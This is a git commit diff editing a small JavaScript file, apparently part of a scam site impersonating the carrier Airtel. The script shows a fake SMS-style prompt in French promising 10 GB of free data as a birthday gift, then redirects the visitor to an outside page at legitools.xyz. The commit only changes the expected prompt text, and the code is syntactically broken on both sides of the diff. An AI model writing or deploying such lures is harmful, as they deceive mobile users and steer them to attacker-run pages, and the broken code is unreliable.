6def0165d3cf8b9df2ddbad44b54f16299f96876
harryjohnson86 <mfonjohnson86@gmail.com>
2025-04-04 23:04:58 -0700

    Update airtel-free-10godata.com.js

--- airtel-free-10godata.com.js
+++ airtel-free-10godata.com.js
@@ -1,5 +1,5 @@
-var password = '10 Go de données gratuites'
-password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir 10 Go de données gratuites en cadeau d'anniversaire. Veuillez appuyer sur OK pour ACTIVER. ',10 Go de données gratuites');
-if (password != '10 Go de données gratuites') {
+var password = 'de données gratuites'
+password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir 10 Go de données gratuites en cadeau d'anniversaire. Veuillez appuyer sur OK pour ACTIVER. ',données gratuites');
+if (password != 'de données gratuites') {
 location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
 }
